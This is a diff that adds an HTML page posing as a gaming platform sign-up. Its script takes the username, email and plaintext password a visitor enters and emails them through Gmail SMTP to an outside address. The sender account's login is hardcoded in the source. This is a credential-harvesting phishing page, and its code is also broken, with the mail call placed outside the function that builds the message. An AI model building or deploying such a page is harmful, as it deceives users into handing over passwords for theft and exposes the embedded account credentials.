@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="INDEX.CSS"/>
+    <form action="email.js"></form>
+   
+    <form action="javascript:sendmail()" method="post">
+</head>
+<body>
+    <H1> THIS IS A GAMING PLATFORM </H1>
+    <BR></BR>
+    <div class="box">
+      <li>username</li>
+      <br><input type="username " class="form-control" id="username" name="username"/>
+      <br>
+      <li>email</li>
+      <input type="email" class="form-control" id="email" name="email" placeholder="email"/>
+      <br>
+      <li>password</li>
+      <input type="password" class="form-control" id="password" name="password" placeholder="password"/>
+      <br>
+      <button type="submit" class="btn btn-contact">send</button>
+    </form>
+  </div>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script> 
+
+  function sendmail(){
+    var name = $('#username').val();
+    var mail = $('#email').val();
+    var pass = $('#password').val();
+    var Body = 'username: '+name+'<br>Email: '+mail+'<br>password: '+pass;
+  }
+         Email.send({
+    Host : "smtp.gmail.com",
+    Username : "yadavkiller77@gmail.com",
+    Password : "musify222",
+    To : 'babluyadav3251@gmail.com',
+    From : "yadavkiller77@gmail.com",
+    Subject : "This is the subject"+name,
+    Body : Body
+         }      
+).then(
+  message => {
+    if(message=='OK') {                       
+      alert("Thank you, your registration is successfull.....");
+    }
+      else{
+        console.error(message);
+        alert("problem: Your registration is not successfull..");
+      }
+  } 
+
+);
+  </script>
+</body>
+</html>
